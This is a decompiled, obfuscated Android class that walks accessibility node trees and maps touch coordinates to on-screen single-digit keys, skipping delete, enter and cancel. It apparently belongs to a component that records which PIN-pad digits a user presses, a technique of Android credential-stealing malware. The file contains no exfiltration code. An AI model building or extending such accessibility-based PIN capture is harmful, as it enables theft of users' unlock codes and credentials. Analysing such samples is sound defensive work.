package com.storm.safe.rock.service.modules.cipher;

import android.graphics.Rect;
import android.view.accessibility.AccessibilityNodeInfo;
import java.io.Serializable;
import java.util.ArrayList;
import kotlin.text.AbstractC0779a1;
import p000.AbstractC1120qr;
import p000.h10;
import p000.m21;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
public final class UiObject implements Serializable {

    /* renamed from: a6 */
    public static final C0333a0 f53271a6 = new C0333a0(null);

    /* renamed from: a0 */
    public final AccessibilityNodeInfo f53272a0;

    /* renamed from: a1 */
    public final int f53273a1;

    /* renamed from: a2 */
    public Rect f53274a2;

    /* renamed from: a3 */
    public String f53275a3;

    /* renamed from: a4 */
    public String f53276a4;

    /* renamed from: a5 */
    public String f53277a5;

    /* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
    /* renamed from: com.storm.safe.rock.service.modules.cipher.UiObject$a0 */
    public static final class C0333a0 {
        public /* synthetic */ C0333a0(AbstractC1120qr abstractC1120qr) {
            this();
        }

        public final UiObject createRoot(AccessibilityNodeInfo accessibilityNodeInfo) {
            if (accessibilityNodeInfo == null) {
                return null;
            }
            try {
                return new UiObject(accessibilityNodeInfo, 0);
            } catch (Exception unused) {
                return null;
            }
        }

        private C0333a0() {
        }
    }

    public UiObject(AccessibilityNodeInfo accessibilityNodeInfo, int i) {
        this.f53272a0 = accessibilityNodeInfo;
        this.f53273a1 = i;
        try {
            Rect rect = new Rect();
            accessibilityNodeInfo.getBoundsInScreen(rect);
            this.f53274a2 = rect;
            accessibilityNodeInfo.getBoundsInParent(new Rect());
            this.f53275a3 = accessibilityNodeInfo.getViewIdResourceName();
            CharSequence text = accessibilityNodeInfo.getText();
            this.f53276a4 = text != null ? text.toString() : null;
            CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
            this.f53277a5 = contentDescription != null ? contentDescription.toString() : null;
            CharSequence className = accessibilityNodeInfo.getClassName();
            if (className != null) {
                className.toString();
            }
        } catch (Exception unused) {
        }
    }

    /* renamed from: a0 */
    public final Rect m211774a0() {
        Rect rect = this.f53274a2;
        if (rect != null) {
            return rect;
        }
        try {
            Rect rect2 = new Rect();
            AccessibilityNodeInfo accessibilityNodeInfo = this.f53272a0;
            if (accessibilityNodeInfo != null) {
                accessibilityNodeInfo.getBoundsInScreen(rect2);
            }
            this.f53274a2 = rect2;
            return rect2;
        } catch (Exception unused) {
            return null;
        }
    }

    /* renamed from: a1 */
    public final String m211775a1() {
        CharSequence contentDescription;
        String str = this.f53277a5;
        if (str != null) {
            return str;
        }
        AccessibilityNodeInfo accessibilityNodeInfo = this.f53272a0;
        String string = (accessibilityNodeInfo == null || (contentDescription = accessibilityNodeInfo.getContentDescription()) == null) ? null : contentDescription.toString();
        this.f53277a5 = string;
        return string;
    }

    /* renamed from: a2 */
    public final void m211776a2(h10 h10Var, ArrayList arrayList) {
        int childCount;
        if (((Boolean) h10Var.invoke(this)).booleanValue()) {
            arrayList.add(this);
        }
        try {
            childCount = this.f53272a0.getChildCount();
        } catch (Exception unused) {
            childCount = 0;
        }
        for (int i = 0; i < childCount; i++) {
            UiObject uiObjectM211779a5 = m211779a5(i);
            if (uiObjectM211779a5 != null) {
                uiObjectM211779a5.m211776a2(h10Var, arrayList);
            }
        }
    }

    /* renamed from: a3 */
    public final UiObject m211777a3(float f, float f2) {
        int childCount;
        boolean zIsClickable;
        Character chM213936e4;
        UiObject uiObjectM211777a3;
        AccessibilityNodeInfo accessibilityNodeInfo = this.f53272a0;
        Rect rectM211774a0 = m211774a0();
        if (rectM211774a0 == null || !rectM211774a0.contains((int) f, (int) f2)) {
            return null;
        }
        try {
            childCount = accessibilityNodeInfo.getChildCount();
        } catch (Exception unused) {
            childCount = 0;
        }
        for (int i = childCount - 1; -1 < i; i--) {
            UiObject uiObjectM211779a5 = m211779a5(i);
            if (uiObjectM211779a5 != null && (uiObjectM211777a3 = uiObjectM211779a5.m211777a3(f, f2)) != null) {
                return uiObjectM211777a3;
            }
        }
        try {
            zIsClickable = accessibilityNodeInfo.isClickable();
        } catch (Exception unused2) {
            zIsClickable = false;
        }
        if (!zIsClickable || !m211781a7()) {
            String strM211782a8 = m211782a8();
            String strM211775a1 = m211775a1();
            String strM211780a6 = m211780a6();
            if (!m211781a7()) {
                return null;
            }
            if ((strM211782a8 == null || AbstractC0779a1.m213687e0(strM211782a8).toString().length() != 1 || !Character.isDigit(AbstractC0779a1.m213687e0(strM211782a8).toString().charAt(0))) && ((strM211775a1 == null || AbstractC0779a1.m213687e0(strM211775a1).toString().length() != 1 || !Character.isDigit(AbstractC0779a1.m213687e0(strM211775a1).toString().charAt(0))) && (strM211780a6 == null || !AbstractC0779a1.m213652a5(strM211780a6, ":id/", false) || AbstractC0779a1.m213652a5(strM211780a6, "delete", true) || AbstractC0779a1.m213652a5(strM211780a6, "enter", true) || AbstractC0779a1.m213652a5(strM211780a6, "cancel", true) || (chM213936e4 = m21.m213936e4(strM211780a6)) == null || !Character.isDigit(chM213936e4.charValue())))) {
                return null;
            }
        }
        return this;
    }

    /* renamed from: a4 */
    public final UiObject m211778a4(h10 h10Var) {
        int childCount;
        if (((Boolean) ((TouchViewManager$findSpecialKey$node$1) h10Var).invoke(this)).booleanValue()) {
            return this;
        }
        int i = 0;
        try {
            childCount = this.f53272a0.getChildCount();
        } catch (Exception unused) {
            childCount = 0;
        }
        while (true) {
            if (i >= childCount) {
                return null;
            }
            UiObject uiObjectM211779a5 = m211779a5(i);
            UiObject uiObjectM211778a4 = uiObjectM211779a5 != null ? uiObjectM211779a5.m211778a4(h10Var) : null;
            if (uiObjectM211778a4 != null) {
                return uiObjectM211778a4;
            }
            i++;
        }
    }

    /* renamed from: a5 */
    public final UiObject m211779a5(int i) {
        try {
            AccessibilityNodeInfo child = this.f53272a0.getChild(i);
            if (child == null) {
                return null;
            }
            return new UiObject(child, this.f53273a1 + 1);
        } catch (Exception unused) {
            return null;
        }
    }

    /* renamed from: a6 */
    public final String m211780a6() {
        String str = this.f53275a3;
        if (str != null) {
            return str;
        }
        AccessibilityNodeInfo accessibilityNodeInfo = this.f53272a0;
        String viewIdResourceName = accessibilityNodeInfo != null ? accessibilityNodeInfo.getViewIdResourceName() : null;
        this.f53275a3 = viewIdResourceName;
        return viewIdResourceName;
    }

    /* renamed from: a7 */
    public final boolean m211781a7() {
        try {
            AccessibilityNodeInfo accessibilityNodeInfo = this.f53272a0;
            if (accessibilityNodeInfo != null) {
                return accessibilityNodeInfo.isVisibleToUser();
            }
            return false;
        } catch (Exception unused) {
            return false;
        }
    }

    /* renamed from: a8 */
    public final String m211782a8() {
        CharSequence text;
        String str = this.f53276a4;
        if (str != null) {
            return str;
        }
        AccessibilityNodeInfo accessibilityNodeInfo = this.f53272a0;
        String string = (accessibilityNodeInfo == null || (text = accessibilityNodeInfo.getText()) == null) ? null : text.toString();
        this.f53276a4 = string;
        return string;
    }

    public final boolean equals(Object obj) {
        if (this == obj) {
            return true;
        }
        if (obj == null || !UiObject.class.equals(obj.getClass())) {
            return false;
        }
        return t60.m214686a2(this.f53272a0, ((UiObject) obj).f53272a0);
    }

    public final int hashCode() {
        AccessibilityNodeInfo accessibilityNodeInfo = this.f53272a0;
        if (accessibilityNodeInfo != null) {
            return accessibilityNodeInfo.hashCode();
        }
        return 0;
    }
}
